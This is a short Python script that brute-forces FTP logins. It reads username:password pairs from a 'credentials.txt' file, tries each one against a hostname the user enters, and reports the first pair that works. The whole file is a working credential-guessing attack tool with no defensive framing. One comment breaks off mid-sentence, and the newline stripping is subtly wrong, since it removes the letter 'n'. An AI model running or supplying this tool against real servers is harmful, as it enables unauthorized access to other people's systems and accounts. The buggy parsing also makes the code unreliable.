import ftplib
#1. WARNING: you need to change the "credentials.txt"'s content & directory in order to success.
#2.You need to target the target's
def BruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        username = line.split(":")[0]
        password = line.split(":")[1].strip("\r").strip("n")
        print(f"[+] Trying {username} and {password}")
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print(f"[+] Login successful for {username} and {password}")
            ftp.quit()
            return (username , password)
        except Exception as e:
            pass

if __name__ == '__main__':
    hostname = input("[+] Enter FTP Hostname: ")
    passwordFile = 'credentials.txt'
    BruteForceLogin(hostname, passwordFile)